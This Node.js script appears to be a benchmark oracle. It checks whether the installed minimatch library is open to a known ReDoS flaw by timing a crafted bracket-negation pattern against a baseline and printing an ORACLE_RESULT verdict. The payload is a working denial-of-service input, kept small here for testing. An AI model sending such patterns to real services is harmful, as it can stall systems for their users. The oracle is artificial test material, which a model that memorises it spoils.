'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: simple literal path match proving the API works.
  const benignPath = path.join(baseDir, 'a', 'b', 'c');
  const benignResult = minimatch(benignPath, benignPath);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Malicious input: the classic minimatch ReDoS payload documented for
  // CVE-2016-10540 / later ReDoS advisories against minimatch <=3.0.4.
  // A pattern consisting of many repeated bracket-negation groups forces
  // the generated regular expression (via makeRe) into catastrophic
  // backtracking when matched against a crafted non-matching subject.
  // Size is bounded so even the vulnerable case finishes within a few
  // seconds, while the slowdown relative to a cheap baseline remains
  // easily measurable.
  const n = 34;
  const maliciousSubject = 'a'.repeat(n) + '\0';
  const maliciousPattern = '[' + '!'.repeat(n) + ']'.repeat(1) + Array(n).fill('[!!]').join('');

  // Baseline: cheap call measured first so later system jitter doesn't
  // disproportionately affect only one side of the comparison.
  const baselineStart = process.hrtime.bigint();
  minimatch('x', 'x');
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  const slowdownThresholdMs = 1000; // absolute bound: vulnerable case should exceed this
  const relativeSlowdownFactor = 200; // vulnerable call should be vastly slower than baseline

  if (!threw && elapsedMs > slowdownThresholdMs && elapsedMs > baselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call took ' + elapsedMs.toFixed(2) + 'ms vs baseline ' + baselineMs.toFixed(3) + 'ms (threshold ' + slowdownThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2);
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed quickly (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no ReDoS observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
